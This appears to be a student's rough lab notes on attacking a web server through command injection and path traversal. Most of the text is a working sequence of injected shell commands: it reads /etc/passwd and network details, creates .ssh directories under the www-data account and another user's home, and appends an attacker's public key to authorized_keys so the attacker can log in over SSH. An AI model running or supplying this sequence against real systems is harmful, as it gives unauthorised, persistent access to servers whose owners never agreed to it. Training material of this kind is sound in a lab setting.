There will be a webserver on the ouside first.
-tricking file to read file from locations it shouldn't
- prepended path directories don't allow you to directly
- COMMAND INJECT - force site to run commands it was no designed to run
```shell
ls ; pwd 
#running below on server
 ; whoami
 ' ls the "www.html" directory
 ; cat /etc/passwd | grep www-data
 ; mkdir /var/www/.ssh
 ; ls -latr & netstat -rn
 || ifconfig
 ; mkdir /var/www/.ssh # make ssh directory in the ww-datas user folder
 ssh-keygen #this will ask o generate file. LEAVE DEFAULT
 cd .ssh
 cat id_rsa.pub # everything in this file is your ssh key
 #use ssh keys from machine to authenticate
 ; echo "RSA key" >> /var/www/.ssh/authorized_keys
 #now you can ssh in as www-data
 ssh www-data@<ip>
 ```
 ------------------------
 upload maliciouse file
 /var/www/html/uploads
 /var/www/

mkdir ../../../../../../home/billybob/.ssh
ls -shla ../../../../../../home/billybob

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCg7ftUkFTSYnMeZCCD9mlCaNzoHQSIh0qFI2mFIS/jHXEJ33SrarLcArpFFoFjDgsJxji/5yLHqem8GW5wJRV5jYe2BBObGpHN/S2lB2zl5kjRKrApg3CY75Fgfz7umx6GoxPHVG5oZjoBXp5V2KAiSPvsIwCRFNvkJdqFULNFr2sCcIy61ce2a/o0dVHr2VHjjkJUIgvEuH4Y6Nf6tINKlGFBxH2prFMz4lCIgO4OLC0VHcmT/ZH431jmkzdg6RuTNolz6uKfy6PY3WcFXJ+RcYzWqcZJ78gYOapIBhQncvJ8sHb5Pdd+EjZOC//aQ11N2pExt2OSLrmfwnXLwMlj student@lin-ops" >> ../../../../../../var/www/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCg7ftUkFTSYnMeZCCD9mlCaNzoHQSIh0qFI2mFIS/jHXEJ33SrarLcArpFFoFjDgsJxji/5yLHqem8GW5wJRV5jYe2BBObGpHN/S2lB2zl5kjRKrApg3CY75Fgfz7umx6GoxPHVG5oZjoBXp5V2KAiSPvsIwCRFNvkJdqFULNFr2sCcIy61ce2a/o0dVHr2VHjjkJUIgvEuH4Y6Nf6tINKlGFBxH2prFMz4lCIgO4OLC0VHcmT/ZH431jmkzdg6RuTNolz6uKfy6PY3WcFXJ+RcYzWqcZJ78gYOapIBhQncvJ8sHb5Pdd+EjZOC//aQ11N2pExt2OSLrmfwnXLwMlj student@lin-ops
